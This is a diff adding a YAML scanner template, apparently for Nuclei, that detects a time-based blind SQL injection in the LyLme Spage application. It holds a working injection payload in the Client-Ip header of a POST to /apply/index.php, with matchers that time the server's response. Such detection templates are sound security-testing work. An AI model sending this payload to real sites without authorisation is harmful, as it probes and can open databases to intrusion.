@@ -1,0 +1,36 @@
+id: poc-yaml-lylme-spage-sqli
+info:
+  name: LyLme Spage SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects a SQL injection vulnerability in LyLme Spage application
+    by leveraging a time-based blind SQL injection vector.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1)+1}}"
+  t3: "{{rand_text_alphanumeric(10)}}"
+
+http:
+  - raw:
+      - |
+        POST /apply/index.php?submit=post HTTP/1.1
+        Host: {{Hostname}}
+        Client-Ip: 0'>if(1,sleep({{t1}}),2)>'
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        url=http://{{t3}}.com&name=test&group_id=1&icon=&authcode=
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"code": "200", "msg": "请等待管理员审核"'
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1) && duration < to_number(t2)"
